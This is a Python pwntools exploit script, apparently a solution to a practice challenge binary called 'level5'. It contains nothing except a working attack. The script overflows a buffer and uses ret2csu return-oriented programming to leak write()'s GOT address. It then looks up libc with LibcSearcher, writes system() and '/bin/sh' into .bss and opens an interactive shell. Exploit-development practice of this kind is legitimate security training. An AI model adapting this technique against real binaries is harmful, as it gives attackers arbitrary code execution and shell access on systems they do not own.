from pwn import *
from LibcSearcher import LibcSearcher
from time import sleep

binary = ELF('level5')
process_instance = process('./level5')

got_addr_write = binary.got['write']
got_addr_read = binary.got['read']
main_function_addr = 0x400564
bss_segment_addr = 0x601028
rop_gadget_pop = 0x400606
rop_gadget_call = 0x4005F0

def construct_exploit_payload(target_func, fd, buf, count, ret_addr):
    return (
        b"\x00" * 136 +
        p64(rop_gadget_pop) + 
        p64(0) + p64(0) + p64(1) + p64(target_func) + 
        p64(fd) + p64(buf) + p64(count) +
        p64(rop_gadget_call) +
        b"\x00" * 56 +
        p64(ret_addr)
    )

payload1 = construct_exploit_payload(got_addr_write, 1, got_addr_write, 8, main_function_addr)
process_instance.recvuntil(b"Hello, World\n")
process_instance.send(payload1)
sleep(1)
write_func_addr = u64(process_instance.recv(8))
libc_searcher = LibcSearcher('write', write_func_addr)
libc_base_addr = write_func_addr - libc_searcher.dump('write')
system_func_addr = libc_base_addr + libc_searcher.dump('system')
process_instance.recvuntil(b"Hello, World\n")
payload2 = construct_exploit_payload(got_addr_read, 0, bss_segment_addr, 16, main_function_addr)
process_instance.send(payload2)
sleep(1)
process_instance.send(p64(system_func_addr) + b"/bin/sh\x00")
sleep(1)
process_instance.recvuntil(b"Hello, World\n")
payload3 = construct_exploit_payload(bss_segment_addr, bss_segment_addr + 8, 0, 0, main_function_addr)
sleep(1)
process_instance.send(payload3)
process_instance.interactive()
